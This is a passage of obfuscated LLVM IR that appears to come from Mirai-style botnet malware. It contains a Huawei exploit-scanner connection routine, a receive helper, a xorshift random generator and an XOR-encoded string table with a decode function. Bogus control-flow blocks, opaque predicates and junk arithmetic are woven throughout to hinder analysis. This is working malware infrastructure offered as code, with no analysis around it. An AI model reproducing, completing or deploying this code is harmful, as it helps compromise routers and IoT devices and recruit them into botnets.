  %610 = icmp slt i32 %609, 20
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %275
  %611 = load i8, i8* %11, align 1
  %612 = zext i8 %611 to i32
  %613 = icmp eq i32 %612, 7
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %307
  %614 = load i8, i8* %11, align 1
  %615 = zext i8 %614 to i32
  %616 = icmp eq i32 %615, 26
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %327
  %617 = load i8, i8* %11, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp eq i32 %618, 28
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %355
  %620 = load i8, i8* %11, align 1
  %621 = zext i8 %620 to i32
  %622 = icmp eq i32 %621, 33
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %375
  %623 = load i8, i8* %11, align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 55
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %395
  %626 = load i8, i8* %11, align 1
  %627 = zext i8 %626 to i32
  %628 = icmp eq i32 %627, 214
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %442
  %629 = load i32, i32* %15, align 4
  %630 = icmp eq i32 %629, 1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %478
  %631 = load i8, i8* %12, align 1
  %632 = zext i8 %631 to i32
  %_87 = sub i32 0, %632
  %gen88 = add i32 %_87, 16
  %_89 = sub i32 0, %632
  %gen90 = add i32 %_89, 16
  %_91 = sub i32 0, %632
  %gen92 = add i32 %_91, 16
  %_93 = shl i32 %632, 16
  %_94 = shl i32 %632, 16
  %633 = shl i32 %632, 16
  %_95 = sub i32 687865856, %633
  %gen96 = mul i32 %_95, %633
  %_97 = shl i32 687865856, %633
  %_98 = sub i32 687865856, %633
  %gen99 = mul i32 %_98, %633
  %_100 = shl i32 687865856, %633
  %_101 = sub i32 0, 687865856
  %gen102 = add i32 %_101, %633
  %_103 = sub i32 0, 687865856
  %gen104 = add i32 %_103, %633
  %_105 = sub i32 0, 687865856
  %gen106 = add i32 %_105, %633
  %634 = or i32 687865856, %633
  %635 = load i8, i8* %13, align 1
  %636 = zext i8 %635 to i32
  %_107 = shl i32 %636, 8
  %_108 = sub i32 0, %636
  %gen109 = add i32 %_108, 8
  %_110 = shl i32 %636, 8
  %637 = shl i32 %636, 8
  %_111 = sub i32 0, %634
  %gen112 = add i32 %_111, %637
  %_113 = shl i32 %634, %637
  %_114 = shl i32 %634, %637
  %_115 = sub i32 %634, %637
  %gen116 = mul i32 %_115, %637
  %_117 = sub i32 %634, %637
  %gen118 = mul i32 %_117, %637
  %_119 = shl i32 %634, %637
  %_120 = sub i32 0, %634
  %gen121 = add i32 %_120, %637
  %638 = or i32 %634, %637
  %639 = load i8, i8* %14, align 1
  %640 = zext i8 %639 to i32
  %_122 = shl i32 %640, 0
  %_123 = shl i32 %640, 0
  %_124 = sub i32 %640, 0
  %gen125 = mul i32 %_124, 0
  %_126 = sub i32 %640, 0
  %gen127 = mul i32 %_126, 0
  %641 = shl i32 %640, 0
  %_128 = shl i32 %638, %641
  %642 = or i32 %638, %641
  %643 = call i32 @htonl(i32 %642) #9
  store i32 %643, i32* %9, align 4
  br label %originalBB86

originalBB132alteredBB:                           ; preds = %originalBB132, %508
  %644 = load i32, i32* %15, align 4
  %645 = icmp eq i32 %644, 3
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %544
  %646 = load i32, i32* %9, align 4
  br label %originalBB136
}

; Function Attrs: noinline nounwind uwtable
define internal void @huawei_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = load i32, i32* @x.61
  %3 = load i32, i32* @y.62
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.exploit_scanner_connection*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %10, align 8
  %13 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 16, i32 4, i1 false)
  %14 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %15 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 8
  %17 = icmp ne i32 %16, -1
  %18 = load i32, i32* @x.61
  %19 = load i32, i32* @y.62
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %31

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = call i32 @close(i32 %29)
  br label %31

; <label>:31:                                     ; preds = %26, %originalBBpart2
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %33 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %34 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %33, i32 0, i32 0
  store i32 %32, i32* %34, align 8
  %35 = icmp eq i32 %32, -1
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* @x.61
  %38 = load i32, i32* @y.62
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %45 = load i32, i32* @x.61
  %46 = load i32, i32* @y.62
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %135

; <label>:53:                                     ; preds = %31
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 5
  store i32 0, i32* %55, align 4
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %57 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i32 0, i32 6
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %57, i32 0, i32 0
  call void @util_zero(i8* %58, i32 256)
  %59 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  %61 = load i32, i32* %60, align 8
  %62 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 8
  %65 = call i32 (i32, i32, ...) @fcntl(i32 %64, i32 3, i32 0)
  %66 = or i32 2048, %65
  %67 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 4, i32 %66)
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %68, align 4
  %69 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %70 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %69, i32 0, i32 3
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %72, i32 0, i32 0
  store i32 %71, i32* %73, align 4
  %74 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %75 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %74, i32 0, i32 4
  %76 = load i16, i16* %75, align 8
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %76, i16* %77, align 2
  %78 = load i32, i32* @huawei_fake_time, align 4
  %79 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %80 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %79, i32 0, i32 1
  store i32 %78, i32* %80, align 4
  %81 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %82 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %81, i32 0, i32 2
  %83 = load i32, i32* %82, align 8
  %84 = icmp eq i32 %83, 3
  br i1 %84, label %90, label %85

; <label>:85:                                     ; preds = %53
  %86 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %87 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %86, i32 0, i32 2
  %88 = load i32, i32* %87, align 8
  %89 = icmp eq i32 %88, 4
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %85, %53
  br label %110

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* @x.61
  %93 = load i32, i32* @y.62
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %101 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %100, i32 0, i32 2
  store i32 1, i32* %101, align 8
  %102 = load i32, i32* @x.61
  %103 = load i32, i32* @y.62
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %110

; <label>:110:                                    ; preds = %originalBBpart28, %90
  %111 = load i32, i32* @x.61
  %112 = load i32, i32* @y.62
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %110
  %119 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %120 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = bitcast %union.__CONST_SOCKADDR_ARG* %12 to %struct.sockaddr**
  %123 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %123, %struct.sockaddr** %122, align 8
  %124 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %12, i32 0, i32 0
  %125 = load %struct.sockaddr*, %struct.sockaddr** %124, align 8
  %126 = call i32 @connect(i32 %121, %struct.sockaddr* %125, i32 16)
  %127 = load i32, i32* @x.61
  %128 = load i32, i32* @y.62
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %135

; <label>:135:                                    ; preds = %originalBBpart212, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %136 = alloca %struct.exploit_scanner_connection*, align 8
  %137 = alloca %struct.sockaddr_in, align 4
  %138 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %136, align 8
  %139 = bitcast %struct.sockaddr_in* %137 to i8*
  call void @llvm.memset.p0i8.i64(i8* %139, i8 0, i64 16, i32 4, i1 false)
  %140 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %136, align 8
  %141 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = icmp ne i32 %142, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %144 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %145 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %144, i32 0, i32 2
  store i32 1, i32* %145, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %110
  %146 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %10, align 8
  %147 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = bitcast %union.__CONST_SOCKADDR_ARG* %12 to %struct.sockaddr**
  %150 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %150, %struct.sockaddr** %149, align 8
  %151 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %12, i32 0, i32 0
  %152 = load %struct.sockaddr*, %struct.sockaddr** %151, align 8
  %153 = call i32 @connect(i32 %148, %struct.sockaddr* %152, i32 16)
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %91

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %71, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %74

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %54

; <label>:33:                                     ; preds = %25
  %34 = load i32, i32* @x.63
  %35 = load i32, i32* @y.64
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %10, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  store i8 65, i8* %45, align 1
  %46 = load i32, i32* @x.63
  %47 = load i32, i32* @y.64
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %originalBBpart2, %25
  %55 = load i32, i32* @x.63
  %56 = load i32, i32* @y.64
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* @x.63
  %64 = load i32, i32* @y.64
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %10, align 4
  br label %21

; <label>:74:                                     ; preds = %21
  %75 = load i32, i32* @x.63
  %76 = load i32, i32* @y.64
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* @x.63
  %84 = load i32, i32* @y.64
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %originalBBpart28, %4
  %92 = load i32, i32* %9, align 4
  ret i32 %92

originalBBalteredBB:                              ; preds = %originalBB, %33
  %93 = load i8*, i8** %6, align 8
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  store i8 65, i8* %96, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = load i32, i32* @x.65
  %2 = load i32, i32* @y.66
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i64 @time(i64* null) #6
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* @x, align 4
  %11 = call i32 @getpid() #6
  %12 = call i32 @getppid() #6
  %13 = xor i32 %11, %12
  store i32 %13, i32* @y, align 4
  %14 = call i64 @clock() #6
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @z, align 4
  %16 = load i32, i32* @z, align 4
  %17 = load i32, i32* @y, align 4
  %18 = xor i32 %16, %17
  store i32 %18, i32* @w, align 4
  %19 = load i32, i32* @x.65
  %20 = load i32, i32* @y.66
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %27 = call i64 @time(i64* null) #6
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @x, align 4
  %29 = call i32 @getpid() #6
  %30 = call i32 @getppid() #6
  %_ = sub i32 %29, %30
  %gen = mul i32 %_, %30
  %_1 = shl i32 %29, %30
  %_2 = sub i32 0, %29
  %gen3 = add i32 %_2, %30
  %_4 = sub i32 0, %29
  %gen5 = add i32 %_4, %30
  %_6 = shl i32 %29, %30
  %_7 = sub i32 %29, %30
  %gen8 = mul i32 %_7, %30
  %_9 = sub i32 %29, %30
  %gen10 = mul i32 %_9, %30
  %_11 = sub i32 %29, %30
  %gen12 = mul i32 %_11, %30
  %_13 = shl i32 %29, %30
  %31 = xor i32 %29, %30
  store i32 %31, i32* @y, align 4
  %32 = call i64 @clock() #6
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @z, align 4
  %34 = load i32, i32* @z, align 4
  %35 = load i32, i32* @y, align 4
  %_14 = shl i32 %34, %35
  %_15 = sub i32 %34, %35
  %gen16 = mul i32 %_15, %35
  %_17 = sub i32 0, %34
  %gen18 = add i32 %_17, %35
  %_19 = sub i32 %34, %35
  %gen20 = mul i32 %_19, %35
  %_21 = sub i32 %34, %35
  %gen22 = mul i32 %_21, %35
  %_23 = sub i32 0, %34
  %gen24 = add i32 %_23, %35
  %_25 = sub i32 %34, %35
  %gen26 = mul i32 %_25, %35
  %36 = xor i32 %34, %35
  store i32 %36, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i64 @clock() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() #0 {
  call void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i32 0, i32 0), i32 14)
  call void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i32 0, i32 0), i32 19)
  call void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i32 0, i32 0), i32 23)
  call void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i32 0, i32 0), i32 24)
  call void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i32 0, i32 0), i32 15)
  call void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i32 0, i32 0), i32 22)
  call void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i32 0, i32 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_entry(i8 zeroext, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i8 %0, i8* %4, align 1
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load i32, i32* %6, align 4
  %9 = sext i32 %8 to i64
  %10 = call noalias i8* @malloc(i64 %9) #6
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %11, i8* %12, i32 %13)
  %14 = load i8*, i8** %7, align 8
  %15 = load i8, i8* %4, align 1
  %16 = zext i8 %15 to i64
  %17 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.table_value, %struct.table_value* %17, i32 0, i32 0
  store i8* %14, i8** %18, align 16
  %19 = load i32, i32* %6, align 4
  %20 = trunc i32 %19 to i16
  %21 = load i8, i8* %4, align 1
  %22 = zext i8 %21 to i64
  %23 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %22
  %24 = getelementptr inbounds %struct.table_value, %struct.table_value* %23, i32 0, i32 1
  store i16 %20, i16* %24, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
